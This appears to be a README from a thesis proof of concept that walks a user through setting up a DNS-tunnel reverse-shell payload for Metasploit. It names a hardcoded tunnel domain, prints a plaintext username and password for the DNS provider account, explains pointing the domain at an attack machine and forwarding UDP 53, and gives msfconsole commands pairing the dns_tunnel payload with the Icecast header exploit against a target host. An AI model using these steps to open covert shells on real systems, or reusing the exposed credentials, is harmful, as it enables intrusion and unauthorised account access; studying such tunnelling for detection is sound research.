Tutorial to start proof of concept
----------------------------------

1. Current version still uses a hardcoded domain (azertontunnel.chickenkiller.com) to tunnel DNS traffic.
To point this domain to your own machine, go to http://freedns.afraid.org and log in using "azerton"/"thesisdaan".

WARNING:
I am aware of the fact that it is impossible this way to test with multiple people at a time. Sending the attacker domain to the DLL stage dynamically (and having an attacker pick his own domain in MSF) is most probably the most urgent todo


2. When you are authenticated on freedns.afraid.org, Under "subdomains make the azertontunnel.chickenkiller.com domain point to your own machine. You can either do this by directly pointing it at your attack machine using an A-record (if you have a static IP) 
	
	azertontunnel.chickenkiller.com A 123.123.123.123
	
Or you can use an NS record to e.g. a dyndns.org service that allows dynamic IP updates:

For example:

	azertontunnel.chickenkiller.com	NS azerton.dyndns.org
	

3. If you are behind a NAT, make sure you forward port 53 UDP to the IP of the attacker's machine (running MSF).


4. After the DNS changes have pushed through (you can verify this by pinging azertontunnel.chickenkiller.com and checking if the response is coming from your machine) you can start the attack using the following command:

sudo ./msfconsole
use <exploit name>
set payload windows/shell/dns_tunnel 
set RHOST <IP address> 
exploit

Most of the tests were done using the icecast exploit (exploit/windows/http/icecast_header) and this is confirmed to work.
Might not fit in all other exploits.

Example of output that you should see if exploitation works and your DNS tunnel is up and running: http://pastebin.com/1PQD6f1D


